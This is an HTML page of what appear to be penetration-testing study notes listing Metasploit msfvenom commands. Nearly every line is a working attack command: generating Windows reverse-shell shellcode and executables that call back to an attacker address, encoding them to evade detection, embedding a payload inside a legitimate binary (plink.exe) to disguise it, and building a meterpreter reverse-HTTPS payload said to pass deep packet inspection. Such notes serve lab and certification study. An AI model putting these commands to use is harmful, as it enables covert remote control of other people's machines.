<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Methods</title>
</head><body><b>Payloads<br/>
<br/>
Generate Shellcode with metasploit<br/>
<br/>
</b>root@kali:~# msfvenom -l payloads<br/>
<br/>
root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 EXITFUNC=thread -f c â€“e x86/shikata_ga_nai -b "\x00\x0a\x0d"<br/>
<br/>
Note: <ul><li style="list-style-type: none"><ul><li style="list-style-type: none">LHOST = ip address of where the reverse shell will connect to</li>
<li style="list-style-type: none">LPORT = Port of where the reverse shell will connect to</li>
<li style="list-style-type: none">-f = format of code. Value c = the code will be formatted in C</li>
<li style="list-style-type: none">-e = set encoder. value x86/shikata_ga_nai = encoder method</li>
<li style="list-style-type: none">-b = bad characters to omit from the payload</li>
<li style="list-style-type: none">EXITFUNC = setting the method that the shelllcode will take on exit. If a program is threaded then this value can be set to thread to avoid killing the whole service and thereby crashing it. </li>
</ul>
</li>
</ul>
<br/>
<br/>
<b>Raw windows PE reverse: </b><br/>
<br/>
root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.5 LPORT=4444 -f exe -o shell_reverse.exe<br/>
<br/>
<br/>
<b>Encode the shellcode:</b><br/>
<br/>
<br/>
root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.5 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe<br/>
<br/>
<br/>
<b>Inject a payload into an exisiting PE executable</b><br/>
<br/>
root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.5 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe<br/>
<br/>
<br/>
<b><br/>
</b><b>Reverse HTTPS (Network Traffic looks exactly like normal HTTPS traffic, allowing bypassubg if deep packet inspection filters and encryption)</b><br/>
<br/>
root@kali:~# msfvenom -p windows/meterpreter/reverse_https LHOST=10.11.0.5 LPORT=443 -f exe -o met_https_reverse.exe<br/>
<br/>
<br/>
</body></html>